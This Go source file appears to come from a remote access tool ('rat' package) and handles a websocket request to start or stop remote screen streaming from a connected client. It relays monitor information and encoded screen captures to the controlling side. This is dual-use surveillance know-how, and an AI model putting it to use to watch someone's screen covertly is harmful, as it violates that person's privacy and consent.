package main

import (
	"encoding/json"
	"fmt"
	"rat/shared/network/header"
	"time"

	"golang.org/x/net/websocket"
)

type ScreenEvent struct {
	Activate bool    `json:"active"`
	Scale    float32 `json:"scale"`
	Monitor  int     `json:"monitor"`
}

type ScreenUpdateMessage Message

func (d ScreenUpdateMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var screenEvent ScreenEvent
	err := json.Unmarshal([]byte(data), &screenEvent)

	if err != nil {
		return err
	}

	stream := screenEvent.Activate
	fmt.Println("Stream:", stream)

	if stream {
		json, err := json.Marshal(&client.Monitors)

		if err != nil {
			return err
		}

		event := newEvent(MonitorQueryEvent, client.Id, string(json))

		err = websocket.JSON.Send(ws, &event)

		if err != nil {
			return err
		}
	}

	scale := screenEvent.Scale
	monitor := screenEvent.Monitor

	client.Listeners[header.MonitorsHeader] = ws

	packet := ScreenPacket{Activate: stream, Scale: scale, Monitor: monitor}
	client.Queue <- &packet

	if !client.Screen.Streaming {
		go ScreenStream(client, ws)
	}

	client.Screen.Streaming = stream

	return nil
}

// ScreenStream streams screen to websocket
func ScreenStream(client *Client, ws *websocket.Conn) {
	for client.Screen.Streaming {
		if !client.Screen.New {
			time.Sleep(time.Millisecond)
			continue
		}

		client.Screen.New = false

		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())

		err := websocket.JSON.Send(ws, &event)

		if err != nil {
			fmt.Println("screenstream:", err.Error())
			return
		}
	}
}
